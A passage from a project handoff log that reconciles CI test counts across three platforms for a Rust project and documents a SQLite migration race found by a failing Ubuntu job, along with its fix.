prefix removed; both are handled in `target/tmp/cicheck.py`.

### Reading run `34919714838`, `P2-T011`'s — and a by-name count that was wrong in the safe direction

Run `34919714838`, commit `73da9a6`. All five jobs `success`:
`bootstrap-validate-windows`, `rust (windows-latest)`, `rust (macos-latest)`,
`rust (ubuntu-latest)`, `shellcheck-secondary`. The three rust jobs each report
**41 result lines = 31 parents + 10 children, 0 failed, 1 ignored**:

| job | result lines | parents | children | passed | failed | ignored |
|---|---|---|---|---|---|---|
| `rust (windows-latest)` | 41 | 31 | 10 | 1040 | 0 | 1 |
| `rust (macos-latest)` | 41 | 31 | 10 | 1042 | 0 | 1 |
| `rust (ubuntu-latest)` | 41 | 31 | 10 | 1043 | 0 | 1 |

**Windows CI equals the local Windows run exactly, value for value** —
`[0, 0, 0, 0, 4, 4, 4, 6, 6, 7, 7, 7, 8, 8, 9, 12, 14, 15, 18, 20, 23, 24, 30,
30, 31, 33, 43, 46, 48, 88, 495]` — which is the comparison that means something.
macOS and Ubuntu report **492** in the `sure-core` lib against **495** on Windows
(−3, the pre-existing platform-gated tests; `running 495 tests` and
`running 492 tests` each appear once per log, read directly rather than inferred
from a set difference) and differ elsewhere only in the same platform-conditional
positions that differed in `P2-T008`'s and `P2-T009`'s runs.

**The 31 parents decompose exactly, which is how the multiset's zeros are
accounted for: 27 `Running` lines + 4 `Doc-tests` lines.** The four doc-tests are
`sure_core`, `sure_domain`, `sure_protocol` and `sure_testkit`, and they are the
four `0 passed` entries at the head of the multiset — a fact worth stating because
four zeros in a sorted list look like padding and are not. `tests\intent_sources.rs`
is the **27th** named binary: 24 at `d5261a6`, 25 at `ec8456d` (+`config_references`),
26 at `b644462` (+`document_commands`), 27 here (+`intent_sources`).

**1040 is `P2-T009`'s 1019 + 21, and the 21 is attributed by binary name.** The
`sure-core` lib went 481 → 495 (+14, the `intent_model` unit tests) and
`tests/intent_sources.rs` is a **new** binary at 7. The result-line count went
40 → 41 and the parent count 30 → 31, **by exactly one**, which is the check that
the +7 is one new test binary and not seven functions scattered into existing
ones. All 14 `intent_model::tests::*` names and all 7 `intent_sources` names were
read out of all three logs **by name**, with 0 `FAILED` test lines in any of them.

**The by-name counter reported zero for those seven on the first attempt, and the
zero was the pattern's fault rather than the run's.** I searched for names
prefixed `intent_sources::`, because the `intent_model` names I had just found
that way all carry a module path. They carry it because they are *unit* tests
inside `src/lib.rs` and libtest prints a unit test with its module path; a test
in `tests/intent_sources.rs` is a top-level `#[test]` in its own binary and
libtest prints it **bare**. `intent_sources::` occurs **0** times in the log —
checkable, and the reason the count was zero. This is the opposite direction from
`P2-T008`'s by-name counter, which was quietly 22 long: a by-name count can be
wrong by inventing names that are not there *and* by failing to match names that
are, and the two mistakes need different fixes. The rule that came out of both:
**match the names you know the binary defines, not a prefix you assume it
prints** — and when a count comes back 0, check whether the pattern occurs at all
before concluding the tests did not run. The seven names were then found on all
three jobs, and the multiset's second 7 and the local
`Running tests\intent_sources.rs ... 7 passed` agree with them.

**One thing this run did not need, and it is the reason the harness was re-run
before the acceptance rather than after.** The `P2-T011` mutation verdicts were
first produced by the harness whose "fired" evidence was a binary count under a
heading that read as a list of tests; both harnesses were corrected and both
re-run, and the re-runs name the failing tests. The `P2-T009` re-run is recorded
in "The `P2-T009` harness, re-run on the corrected evidence parser" — it
reproduces the accepted verdict with evidence that names tests, which is what
makes the earlier evidence's defect a defect in the record rather than in the
conclusion.

### Reading run `34917710402`, `P2-T009`'s — and a log that needed its escape codes stripped

Five jobs, five `success`: `bootstrap-validate-windows`, `rust (windows-latest)`,
`rust (macos-latest)`, `rust (ubuntu-latest)`, `shellcheck-secondary`. Read out
of the three rust logs rather than off the colours:

| job | result lines | parents | children | passed | failed | ignored |
|---|---|---|---|---|---|---|
| `rust (windows-latest)` | 40 | 30 | 10 | 1019 | 0 | 1 |
| `rust (macos-latest)` | 40 | 30 | 10 | 1021 | 0 | 1 |
| `rust (ubuntu-latest)` | 40 | 30 | 10 | 1022 | 0 | 1 |

**Windows CI equals the local Windows run exactly, value for value** —
`[0, 0, 0, 0, 4, 4, 4, 6, 6, 7, 7, 8, 8, 9, 12, 14, 15, 18, 20, 23, 24, 30, 30,
31, 33, 43, 46, 48, 88, 481]` — which is the comparison that means something.
macOS and Ubuntu report 478 in the `sure-core` lib against 481 on Windows (−3,
the pre-existing platform-gated tests) and differ elsewhere only in the same
platform-conditional binaries that differed in `P2-T008`'s run.

All 36 `documents::tests::*` names and all 20 `document_commands` names were read
out of all three logs **by name**, with 0 `FAILED` lines in any of them. The
by-name count needed one correction: a pattern anchored only on
`documents::tests::` matches **41** distinct names, not 36, because another
module's path also ends in `documents` — so the 36 is 41 minus the 5 that belong
to it, and a prefix-anchored pattern would have quietly merged them. That is the
same class of error as the by-name target counter in `P2-T008`'s run, one layer
down.

**One mechanical thing worth recording, because it silently produced a wrong
answer first.** `gh run view --log` prefixes every line with
`<job>\t<step>\t<timestamp> ` **and leaves cargo's ANSI colour codes in place**,
so `^\s*Running ...` never matches and every result line is attributed to the
unknown target `?`. The section-per-binary mapping is only recoverable after
stripping `\x1b\[[0-9;]*m`. The counts above are unaffected — they come from the
`test result:` lines — but the by-name attribution is not, and it was wrong until
the escapes came out.

**And the thing this run did not have to catch, because the harness caught it
first.** The number carried into this session as "all gates green — 1017 passed"
had been measured before the two byte-budget tests were written. Running the
harness's unmutated baseline is what exposed it: the suite was red before a
single mutation was applied. A push whose run is read is the rule; a *local*
green that is quoted from an earlier measurement is the same failure one step
earlier, and it is the reason the baseline check exists.

### Reading run `34877928915`, `P2-T008`'s — and a by-name counter that was quietly 22 long

Run `34877928915`, commit `ec8456d`. All five jobs green. The three rust jobs
each report **39 result lines = 29 parents + 10 children, 0 failed, 1 ignored**:
Windows 963, macOS 965, Ubuntu 966. Windows CI equals the local Windows run
**exactly**, value for value, as a multiset:

```
0 0 0 0 4 4 4 6 6 7 7 8 8 9 12 14 15 18 23 24 30 30 31 33 43 46 48 88 445
```

The three platforms differ from one another only by the pre-existing
platform-conditional tests — macOS and Ubuntu carry `442 24 25 47` where Windows
carries `443 23 46` — which is the same cross-platform shape `P2-T012`'s run
showed, and is why the multiset is sound on all three while only Windows supports
per-name attribution.

**A wrong comparison was built and thrown away before this one, and the way it
was caught is the reusable part.** The first attempt built the after-multiset out
of a `collections.Counter` keyed by the `Running` line's target name. That
collapses every crate's `unittests src\lib.rs` into one row, so the multiset came
back **22 values long against 29 parents** — and the substitution check reported
`False`. The check was wrong, not the code. **What caught it was printing
`len(after)` next to `len(before)`**: a multiset comparison between two lists of
different lengths is not a comparison, which is the same positional-diff rule
`P2-T012`'s entry below records, arriving from the other direction. The counter
was replaced by a list built from `(path, crate)` read out of the `Running` line's
`.exe` basename.

The +43 against the last accepted state, attributed by binary:
`920 at 481066f` → `963`, being **+23** lib tests in `references`, **+17** in the
new `config_references` binary, then **+2** and **+1** more added to those same
two binaries after the first mutation run found them uncovered. The parent count
went 28 → 29 in the first step and stayed there in the second, which is what the
two steps should look like: a new test binary adds a parent, and test functions
added to existing binaries do not.

The 25 `references::tests::*` names and all 18 `config_references` names were
read out of **all three** logs by name, 0 `FAILED` on each, including the three
tests this session added:
`a_key_written_beside_another_piece_of_text_is_not_a_key`,
`a_quoted_argument_that_is_not_a_key_is_not_a_read` and
`the_sentence_counts_each_side_and_not_the_keys_there_are`.

### Reading run `34873225889`, `P2-T012`'s — and a positional diff that would have been a lie

**All five jobs green.**

| job | result lines | parents | children | passed | failed | ignored |
|---|---|---|---|---|---|---|
| `rust (windows-latest)` | 38 | 28 | 10 | **920** | 0 | 1 |
| `rust (macos-latest)` | 38 | 28 | 10 | **922** | 0 | 1 |
| `rust (ubuntu-latest)` | 38 | 28 | 10 | **923** | 0 | 1 |

**920 is the local Windows figure exactly**, measured before the push and not
predicted from it. The raw sum over all 38 lines is 930 / 932 / 933, which
over-counts by exactly 10 for the reason recorded above. The platform offsets are
+2 and +3, unchanged.

#### The +13, attributed to four named binaries

Read out of the Windows log by name, the way the previous entry's +30 was:

| binary | before | after | delta |
|---|---|---|---|
| `sure_core` (lib) | 416 | **420** | **+4** |
| `sure_domain` (lib) | 87 | **88** | **+1** |
| `wire_contract` | 29 | **30** | **+1** |
| `support_levels` | — | **7** | **+7** (new binary) |

**4 + 1 + 1 + 7 = 13, and every other position is identical** — `sure` 48,
`sure_protocol` 46, `fingerprint_git` 43, … `sure_testkit` 0, all unchanged. The
matcher printed **23 `Running` lines matched before and 24 after**, which is the
check that the pattern is alive: a name matcher that matches nothing prints a
well-formed table of zeros that reads exactly like "no binary changed". The named
binaries sum to **903 → 916** against job totals of **907 → 920**; the difference
is **4 in both**, which is `Doc-tests sure_core`, and the other three doc-test
targets are the three zeros at the end of each multiset.

The four places match where `P2-T012` put code: four unit tests in
`sure_core::support`, one in `sure_domain`'s vocabulary, one added to
`sure-domain`'s `wire_contract` for the `serde(default)` behaviour, and the
seven-test `support_levels` integration binary.

#### The 13 new tests, read out of all three logs by name

All thirteen were found **exactly once on each of the three `rust` jobs**: the
seven `support_levels` tests, the four `support::tests`,
`vocabulary::tests::an_unclassified_project_defaults_to_the_weakest_level_and_says_it_has_no_answer`,
and `wire_contract`'s
`a_project_record_stored_before_support_existed_reads_as_unclassified`. None is
`#[cfg]`-gated, so all three platforms running all thirteen is the expected
result — and it is checked rather than assumed, because a test that was never
collected is invisible in a total. `target/tmp/p2t012names.py` prints one row per
name with the match count per job, and fails if any name is missing from any job.

#### Why there is no position-by-position multiset diff here

The previous two entries compared the sorted multisets position by position, and
that was sound **because no parent was added in those runs**: both lists were the
same length, so a differing position meant a differing count. **`P2-T012` adds a
parent** — 27 → 28, the new `support_levels` binary. The positional diff was run
anyway, and it produced exactly the table this file exists to refuse:

```
position  0: 416 -> 420  (+4)     real
position  1:  87 ->  88  (+1)     real
position  8:  29 ->  30  (+1)     real
position 18:   6 ->   7  (+1)     ARTIFACT — the inserted 7, pushing a 6 right
position 20:   4 ->   6  (+2)     ARTIFACT — a 4 measured against the 6 that moved into its place
position 23:   0 ->   4  (+4)     ARTIFACT — a doc-test target measured against a real binary
```

**Three of the six rows name nothing.** They are not merely imprecise: each is
well-formed, arithmetically consistent, and describes a movement that did not
happen. Nothing about the output distinguishes them from the three real rows —
only knowing that a parent was inserted does. So the comparison that is used is
**substitution**: apply the four Windows-by-name deltas to each platform's
*before* multiset and ask whether the *after* multiset comes back exactly.

| platform | before + { +4, +1, 29→30, one new 7 } | vs after |
|---|---|---|
| `rust (windows-latest)` | `420 88 48 46 43 33 31 30 30 24 23 15 14 12 9 8 8 7 7 6 6 4 4 4 0 0 0 0` | **identical** |
| `rust (macos-latest)` | `417 88 48 47 46 33 31 30 29 25 24 15 14 12 9 8 8 7 7 6 6 4 4 4 0 0 0 0` | **identical** |
| `rust (ubuntu-latest)` | `417 88 48 47 46 33 31 30 30 25 24 15 14 12 9 8 8 7 7 6 6 4 4 4 0 0 0 0` | **identical** |

**The caveat from last time still applies and is not softened by this
succeeding.** Substitution shows the Unix multisets are *consistent with* those
four deltas; it does not determine them, because a different four deltas could
also map before onto after. What is supported is "the Unix jobs gained the same
four positions as Windows", not "the Unix jobs gained those four counts on those
four binaries". **The Windows name table is what pins the attribution**; the
multiset is what says the attribution is not a Windows-only story.

The general rule, which is the durable part: **a positional diff of two sorted
lists is only a comparison when the lists are the same length.** Print the
lengths beside the rows, or do not print the rows.

### Reading run `34866795192`, the fix's — and a multiset comparison on all three platforms

**All five jobs green**, including `rust (ubuntu-latest)`, the one that failed.

| job | result lines | parents | children | passed | failed | ignored |
|---|---|---|---|---|---|---|
| `rust (windows-latest)` | 36 | 26 | 10 | **877** | 0 | 1 |
| `rust (macos-latest)` | 36 | 26 | 10 | **879** | 0 | 1 |
| `rust (ubuntu-latest)` | 36 | 26 | 10 | **880** | 0 | 1 |

**877 is the local Windows figure exactly**, measured before the push and not
predicted from it. The raw sum over all 36 lines is 887 / 889 / 890, which
over-counts by exactly 10 for the reason recorded above.

The six new test names were read out of **all three** `rust` logs **by name** —
each present exactly once on each platform, `0 FAILED` lines in each log:
`a_file_another_connection_migrated_before_the_check_is_not_reported_as_foreign`,
`a_file_that_moved_to_a_newer_schema_before_the_check_is_reported_as_newer`,
`a_file_with_somebody_elses_table_is_still_refused`,
`the_check_reads_the_file_in_one_transaction`,
`a_statement_sure_ran_to_look_reports_contention_as_contention`,
`a_file_that_reported_a_version_is_not_looked_at_again`.

#### The multiset, against the run before it, on every platform

The previous run's logs were fetched rather than remembered, so the comparison is
over all three platforms and not only the one this file had recorded:

| platform | before | after | positions that moved |
|---|---|---|---|
| `rust (windows-latest)` | 871 | **877** | **1** — the lib, `401 → 407` |
| `rust (macos-latest)` | 873 | **879** | **1** — the lib, `398 → 404` |
| `rust (ubuntu-latest)` | 874 | **880** | **1** — the lib, `398 → 404` |

**Exactly one position moved on each platform, and it moved by exactly 6.** Every
other position in the 36-value multiset is identical, on all three. That is the
whole attribution: the six tests this commit adds are in the lib target and
nowhere else, and nothing else in the suite changed size.

The platform spread is likewise unchanged: macOS and Ubuntu carry 3 more lib
tests than Windows (the `#[cfg(unix)]` ones), giving +2 and +3 on the totals, and
those offsets were +2 and +3 before this commit as well.

### Reading run `34865716315` — red, on a commit that changed only this file

**This is the run that showed a defect, and the shape of the run is most of the
diagnosis.** `906bfb0` edits `progress/HANDOFF.md` and nothing else. There is no
Rust in it. It came back:

| job | conclusion |
|---|---|
| `shellcheck-secondary` | success |
| `bootstrap-validate-windows` | success |
| `rust (windows-latest)` | **success** |
| `rust (macos-latest)` | **success** |
| `rust (ubuntu-latest)` | **failure** |

Two tests failed, both in `sure-core --test store_concurrency`:

```text
thread 'child_writer' (5763) panicked at crates/sure-core/tests/store_concurrency.rs:222:49:
the store opens: Migration(Foreign { tables: ["records"] })
thread 'many_processes_opening_a_fresh_file_do_not_report_a_broken_history' (5751) panicked at crates/sure-core/tests/store_concurrency.rs:470:9:
opener 5 failed with exit status: 101
```

**The message is the finding.** `records` is the table SURE's own migration 1
creates. SURE told the user that SURE's own history file was a SQLite database
somebody else had made, and named SURE's own table as the evidence.

**Three platforms on one commit is what rules out a broken test.** A test that is
wrong is wrong everywhere; this failed on one of three. The two that passed are
not a second opinion — they are the same defect with a scheduler that did not
open the window. Every earlier run of this branch was green, so the window is
narrow, which is exactly why it survived `P2-T002` through `P2-T007`.

#### The window, and why "it is only a race" was not good enough to leave

`migrations::apply` read the version, then read the table list, with nothing
between them:

```rust
let current = version(connection)?;          // (1) what version is this?
...
if current == 0 {
    let tables = user_tables(connection)?;   // (2) does it already have tables?
```

Two processes open a file that does not exist yet and both read version 0 at (1).
One of them migrates it — the DDL and the `user_version` write are a single
transaction, so the file goes from *(0, no tables)* to *(1, `records`)* with no
bad half-state in between. The other then asks (2) and is told there is a table.
The two answers describe two different moments, and the conclusion drawn from
them — "this file is not mine" — is false.

`apply_one` already re-read the version *inside* its write transaction, and its
doc comment says why at length. The foreign-database check had no such protection
and no comment saying it needed one. **The module documented the race it had
thought about, in the function that did not have it.**

#### The fix, and the part of it no test can reach

`resolve_fresh_database(connection, seen)` now does the check, reading the
version and the tables **inside one read transaction**. Two things in it are
load-bearing and they are not the same thing:

- the version is read **again** inside, which corrects a `seen` that went stale
  before the call — the shape the failing run had;
- the two reads are **bracketed**, which stops a commit landing between them.

**Only the first is reachable from a test**, and this was measured rather than
assumed: deleting the bracketing and re-running left **all 20 tests passing**.
So there is now a test that fails when the bracketing is removed and on nothing
else — `the_check_reads_the_file_in_one_transaction`, which asks the function to
run where it must not (inside a transaction) and asserts that it refuses. It is
written from the outside because the inside needs a writer to commit in the
middle of a function, which is the race itself. That is stated in the module doc
and in the test, not left for a reader to discover.

A file that moved to a *newer* schema in the window is now `NewerSchema`. It used
to be `Foreign { tables: ["records"] }` — the same wrong answer, with the version
that actually moved left unsaid.

`MigrationError::Inspect` is new, for a statement SURE ran to *look* at the file
rather than to change it, and the mapping is unit-tested against errors SQLite
really produced (a genuine `SQLITE_BUSY` from a second `BEGIN IMMEDIATE`, and a
genuine syntax error) rather than against errors built to match the pattern.

#### How the reproduction was made deterministic, and why it had to be

The failing test is a race, and **a flaky test cannot tell a fix from a lucky
run** — that is the whole reason the fix is justified by a unit test instead. The
sequence was: extract the two reads into a named function with **today's
behaviour unchanged**, write the test, and watch it go red with the same string
CI printed —

```text
called `Result::unwrap()` on an `Err` value: Foreign { tables: ["records"] }
```

— before writing any fix. Then fix, then green. The stale version is *passed in*
rather than provoked, because it is the same input the race produces and it does
not depend on the scheduler being unkind.

The `store_concurrency` test was also run **8 times** after the fix with no
failure. That is a smoke check and is recorded as one: eight green runs of a test
that fails roughly one run in five proves very little, and it is not offered as
evidence. The deterministic test is the evidence.

### Reading run `34864498113`, `P2-T007`'s — and a comparison against the run before it

**All five jobs green**: `shellcheck-secondary`, `bootstrap-validate-windows`,
`rust (windows-latest)`, `rust (macos-latest)`, `rust (ubuntu-latest)`.

| job | result lines | parents | children | passed | failed | ignored |
|---|---|---|---|---|---|---|
| `rust (windows-latest)` | 36 | 26 | 10 | **871** | 0 | 1 |
| `rust (macos-latest)` | 36 | 26 | 10 | **873** | 0 | 1 |
| `rust (ubuntu-latest)` | 36 | 26 | 10 | **874** | 0 | 1 |

**Windows CI printed exactly the figure the local Windows run printed, 871** —
the same agreement every run on this branch has produced, and the reason the
local gate set is worth running at all. The parent count went 25 → 26 because
`components_graph.rs` is a new test binary; the child count is unchanged at 10.
The `+2` macOS and `+3` Ubuntu deltas are the `#[cfg(unix)]` tests `P2-T002`
recorded, unchanged from the two runs before this one.

**The 22 new tests were read out of all three `rust` logs by name, not inferred
from the job colours.** Each of the 18 `components::tests::*` names and each of
the 4 `components_graph` names is `... ok` on Windows, macOS and Ubuntu, and the
count of `FAILED` lines matching those names is **0 on all three**. That check is
the one the counts cannot make.

**The name that most needed it is `the_component_graph_opens_no_file_and_starts_no_process`.**
Unlike the other three, which build a fixture under `target/tmp` and discover it,
this one reads `crates/sure-core/src/components.rs` through
`sure_testkit::repository_root()` — so it depends on the checkout layout rather
than on the fixture machinery. A path-dependent test that passes locally is
exactly the kind that can pass nowhere else, and it is `ok` on all three
platforms. Reading it by name is what makes that a fact.

**The Windows multiset came back one for one:**
`401, 87, 46, 43, 36, 33, 31, 30, 29, 24, 23, 15, 13, 12, 9, 8, 7, 6×2, 4×3,
0×4` — **26 values for 26 expected binaries**, with `401` appearing exactly once
and `4×3` where it was `4×2`.

**This run was compared against the run before it, which is a stronger check
than either multiset alone.** Both counts were taken the same way, over the
parent sections of each `rust` job's log, so the two are comparable:

| position | `34858555861` (`9c931d0`) | `34864498113` (`586d3a3`) | moved |
|---|---|---|---|
| lib, Windows | 374 | **401** | +27 |
| lib, macOS and Ubuntu | 371 | **398** | +27 |
| the `4` binary | `4×2` | **`4×3`** | +1 binary, 4 tests |
| **every other position** | — | — | **identical** |

**+27 is 9 + 18 and it is the two test-adding commits that sit between the two
runs, not one.** `374 → 383` was `P2-T006`'s nine `pattern.rs` tests, whose own
reading is below; `383 → 401` is this task's eighteen. 840 + 9 = 849 and
849 + 22 = 871, and 22 is 18 module tests plus the 4 in the new binary.

**The four positions where Windows and the Unix jobs differ were already
different, in the same places, in the run before this one.** Windows carries
`43` and `23` where the Unix jobs carry `47` and `25`, and macOS replaces
Windows' single `30` with a second `29`. All four are unchanged between the two
runs, so they are pre-existing platform-gated tests and **not something
`P2-T007` introduced** — which is the thing a single run's multiset cannot say,
because a difference with nothing to compare it to looks the same whether it is
old or new. This file still does **not** attribute any of the four to a named
test.

**The raw sum over all 36 lines is 881 on Windows**, over-counting by exactly 10
for the reason recorded above; macOS 883 and Ubuntu 884 raw. Every figure in this
section is the sum over the 26 parent sections.

### Reading run `34854388756`, `P2-T005`'s — and a counting method that is only sound where it was used

**All five jobs green**, and this is the first run in which **any Python
discovery test has ever executed**, on any platform.

**The names were read out of all three `rust` logs, not inferred from the
colour.** `a_project_with_no_manifest_sure_can_read_is_not_called_fully_understood`,
`discovery_runs_nothing`,
`every_file_that_marks_a_python_project_is_enough_on_its_own` and
`a_scan_that_looked_at_everything_says_so_and_one_that_did_not_says_what_it_missed`
are each `... ok` **exactly once in each of the Windows, Ubuntu and macOS logs**.
That is what makes "the Python tests ran on Unix" a fact rather than an
inference from a green job, and it is the check the counts cannot make.

| job | result lines | parents | children | passed |
|---|---|---|---|---|
| `rust (windows-latest)` | 34 | 24 | 10 | **786** |
| `rust (macos-latest)` | 34 | 24 | 10 | **788** |
| `rust (ubuntu-latest)` | 34 | 24 | 10 | **789** |

**Windows CI printed exactly the figure the local Windows run printed, 786, which
is the fact worth having.** It is a stronger statement than "green": the same
number from two independent executions on the same platform, one of them the one
that will judge every future push. The `+2` macOS and `+3` Ubuntu deltas are the
`#[cfg(unix)]` tests `P2-T002` recorded, unchanged, and 786 + 2 and 786 + 3 are
the two totals to the test.

**The acceptance commit's own run was read too — `34855496424`, on `37a848a`,
all five jobs green.** `progress/state.json` and this file are the only things it
touches, and the count came back **786 / 788 / 789 with 0 failed over 34 result
lines on every platform**, which is the implementation's figures to the test.
That is what a documentation-only commit's run is for: it says the record was
added **without changing what it records**, and it is the cheapest place to
notice that a "docs only" change was not one.

**A method lesson, learned here by getting it wrong twice.** Attributing a
`test result:` line to a target **by proximity in a CI log is invalid**. Cargo
writes `Running <target>` to stderr and the test harness writes `test result:` to
stdout, and the runner merges the two by arrival — so on CI a target's result
lines appear **before** the `Running` line that produced them. Read that way, a
macOS log showed `discover_node` at **9 passed** for a 33-test binary, and
`discover_python` at **33** and again at **31** in the same log. None of those
three numbers is a fact about the binary; they are facts about interleaving.
There is one child signature that survives this, because `store_concurrency`'s
children print a line no other target can print — `0 ignored; 0 measured; 6
filtered out` — so the ten children can be identified and subtracted with
confidence. **The figures above are counts over a whole job's step, minus those
ten.** Per-target counts are quoted in this file **only from the local run**,
where both streams reach one pipe in write order and the attribution is sound.

### Reading run `34861419193`, the `P2-T006` tests commit's

**All five jobs green**, and the count is the one a tests-only commit has to come
back with: **849 / 851 / 852 passed, 0 failed, 1 ignored, over 35 result lines =
25 parents + 10 children on every platform.** Against the row above that is
**+9 on each of the three**, and +9 is exactly the number of tests the commit
added — so the commit is what it says it is and nothing else moved. **Windows
849 equals the local Windows run exactly**, which is the same agreement the
implementation commit produced and the reason the local gate set is worth running
at all.

**All nine `pattern.rs` tests were read out of all three `rust` logs by name, and
`... ok` on each.** That mattered more here than for a normal test: one of the
nine branches on the platform, and its **Unix half had never executed anywhere**
before this run. `an_absolute_pattern_is_refused_where_this_platform_says_it_is_absolute`
asserts that `C:\Windows` is refused on Windows and is **one ordinary file name**
on Unix, where a backslash is legal in a name and there is no drive letter to
read. Windows takes the first branch; macOS and Ubuntu took the second for the
first time, and both passed.

**The Windows multiset is the per-target check, and it came back one for one:**
`383, 87, 46, 43, 36, 33, 31, 30, 29, 24, 23, 15, 13, 12, 9, 8, 7, 6×2, 4×2,
0×4` — **25 values for 25 expected binaries.** The only two that moved against
the previous run are `374 → 383` (the lib, +9) and the unchanged `24`
(`discover_rust`), and `383` appears exactly once, which is what makes the
attribution usable rather than merely suggestive. The same caveat as before
applies: two binaries could in principle share a count, so this is a check that
would catch a wrong figure and is not a proof.

**The raw sum over all 35 lines is 859 on Windows, over-counting by exactly 10**
for the reason recorded above; macOS 861 and Ubuntu 862 raw. Every figure in this
section is the sum over the 25 parent sections.

### Reading run `34858555861`, `P2-T006`'s — and the arithmetic that bit twice

**All five jobs green**, and the first run in which any **Rust** discovery test
has executed anywhere.

| job | result lines | parents | children | passed | failed | ignored |
|---|---|---|---|---|---|---|
| `rust (windows-latest)` | 35 | 25 | 10 | **840** | 0 | 1 |
| `rust (macos-latest)` | 35 | 25 | 10 | **842** | 0 | 1 |
| `rust (ubuntu-latest)` | 35 | 25 | 10 | **843** | 0 | 1 |

**Windows CI printed exactly the figure the local Windows run printed, 840**, the
same agreement `P2-T005` had at 786. The section count went 34 → 35 because
`discover_rust` is a new test binary, so the parents went 24 → 25; the child count
did not move. The `+2` and `+3` deltas are the `#[cfg(unix)]` tests `P2-T002`
recorded, unchanged from the previous two runs.

**A trap in the counting, worth writing down because it was stepped in.** The raw
sum over all 35 result lines is **850** on Windows — and it is wrong by exactly
**10**. `store_concurrency`'s ten children each print
`1 passed; 0 failed; 0 ignored; 0 measured; 6 filtered out`, and the parent
section's own line already counts those same tests, so summing every line counts
them twice. **The figure to report is the sum over the 25 parent sections**, which
is 840. The first pass of this run's count printed 850 and the number looked
plausible; it was caught only because it disagreed with the local run. That is the
argument for having both numbers: a figure read one way and a figure computed
another way, and the disagreement is the signal.

**All 54 new test names were read out of all three `rust` logs by name** — the 30
`#[test]`s in `rust.rs` and the 24 in `discover_rust.rs`, each `... ok` in each of
the Windows, macOS and Ubuntu logs, 54/54 on every platform. The check is
mechanical rather than by eye: parse the two files for functions carrying a
`#[test]` attribute, then require `test <name> ... ok` to appear in the job's
lines. A first attempt at this reported 55 names "missing" on every platform and
all of them were artifacts of the extraction, not facts about the run: the lib
target qualifies its test names with the module path
(`test discover::rust::tests::<name> ... ok`), and the integration file's helper
`fn listing` is not a test at all. **A name check that has not been checked
against a name that certainly ran is not evidence**; the two errors here were
opposite in direction from the count error above, and both were found by the
number being implausible rather than by being read.

Per-target attribution is still unavailable for the reason recorded above: a
24-test result line appears **exactly once** in each of the three logs, which is
consistent with `discover_rust`'s 24 tests, and consistency is all it is.

### Reading run `34851008124`, the fix for the red acceptance

**All five jobs green, and the test that failed was read out of all three `rust`
logs by name rather than taken from the colour of the job.** The string
`a_path_a_manifest_named_cannot_leave_the_project ... ok` appears **exactly once
in each** of the Windows, Ubuntu and macOS logs — the same test that failed on
two of them one run earlier. Zero `FAILED`, zero `error: test failed`, in all
five logs. The only occurrences of the word `panicked` anywhere in the log are
inside the name of a test that passed
(`scan::ignore::tests::a_path_that_climbs_out_of_itself_is_answered_rather_than_panicked_over`),
which is worth stating plainly because a grep for the word returns three hits.

**The counts, and a subtraction that has to be written down because the number a
raw sum gives is not the number this file quotes.** Summing every `test result:`
line in a job gives **736 / 739 / 738** (Windows / Ubuntu / macOS). Every figure
this file has quoted for a workspace run is **726 / 729 / 728** — exactly ten
less, on each platform. The ten are `store_concurrency`'s child processes, four
writers and six openers, each printing

```
test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 6 filtered out; finished in 0.79s
```

Their lines *are* in the CI log, so a sum that does not know about them counts
them. Both figures are arithmetic on the same log, and only the second is the
workspace's test count.

**`33 result lines` decomposes the same way, and reconciles: 23 parent sections
plus those 10 children.** The 23 are the 19 test binaries and the 4 doc-test
targets, in that order in the log. Taken section by section for Windows:

| | count |
|---|---|
| test binaries | 19 |
| doc-test targets | 4 (`sure_core` 4 passed, `sure_domain`, `sure_protocol`, `sure_testkit` 0 each) |
| parent sections | **23** |
| `store_concurrency` children | 10 |
| result lines | **33** |
| parents' passed, summed | **726** |

The four zero-or-small `Doc-tests` targets matter beyond bookkeeping: a
zero-test section still prints a `test result:` line and prints **no `test ...`
lines at all**, which is the one-line shape a short capture loses. See "the
32-vs-33 paragraph" above — this run is the evidence for it, and the lost line
is a property of capture rather than of the suite.

**Per platform, unchanged where it should be and different where it must be:**

| job | result lines | parents | children | parent passed | `sure-core` lib | `discover_node.rs` |
|---|---|---|---|---|---|---|
| `rust (windows-latest)` | 33 | 23 | 10 | **726** | 315 | 33 |
| `rust (ubuntu-latest)` | 33 | 23 | 10 | **729** | 312 | 33 |
| `rust (macos-latest)` | 33 | 23 | 10 | **728** | 312 | 33 |

The `sure-core` lib is 315 on Windows and 312 on both Unix jobs, and the
`+3`/`+2` spread against the Unix totals is the same one `P2-T003` recorded. The
new integration binary is **33 on all three**, which is the number `--list`
gave locally.

**What this run does and does not settle.** It settles that the fix compiles and
passes **on Unix**, which is the thing that could not be checked here and the
reason the fix was pushed at all. It does not settle the `#[cfg(unix)]` arm of
`link_to_directory`: that test is in `discover_node.rs`, which ran 33 tests on
each platform, and its Unix arm running green there is evidence about that arm
only to the extent the test names can be matched up — which they have not been,
test by test, and this file should not imply otherwise. What was verified by
name is the one test whose failure started this.

### Reading run `34850549120`, `P2-T004`'s — and a claim in this file that it falsified

**Red on both Unix jobs, green on all three Windows-side jobs.** Windows
`rust (windows-latest)` passed, `bootstrap-validate-windows` passed, so a
Windows-only gate set would have shown this acceptance as clean. That is the
pattern this section exists for.

One test, read out of the log by name and by message rather than inferred from
the colour:

```
test discover::read::tests::a_path_a_manifest_named_cannot_leave_the_project ... FAILED
panicked at crates/sure-core/src/discover/read.rs:571:13:
"C:\\Windows" was accepted as a path inside the project
```

on **both** `rust (ubuntu-latest)` and `rust (macos-latest)`.

**The code was right and my test was wrong.** A Windows-spelled absolute path is
not absolute on Unix: with no `/` in it, `C:\Windows` is a single
`Component::Normal` — one relative name, and a legal name for a file inside the
project. `contained_relative` accepting it is correct on that platform and
harmless, because the caller then looks for a directory by that name and finds
nothing. The test had listed `r"C:\Windows"` and `r"\\server\share"` among the
strings that must be refused, which is true only where those spellings are
absolute.

**The claim this falsified is worth recording, because I wrote it in this file
one commit earlier.** `P2-T004`'s entry said:

> This task adds no platform-gated test, so nothing in it is invisible to a
> Windows run the way the `#[cfg(unix)]` link tests are.

**That is false, and it was the reason the failure was a surprise.** The task has
three platform-dependent surfaces, not none: a `#[cfg(windows)]`/`#[cfg(unix)]`
pair for `link_to_directory` (a **directory** link via `mklink /J` on Windows and
`std::os::unix::fs::symlink` on Unix), whose Unix arm has never run here; this
assertion; and the general class the sentence missed — an assertion about
*platform behaviour* is invisible to a Windows run even when no `#[cfg]`
attribute appears anywhere near it. The lesson is not "list the gated tests"; it
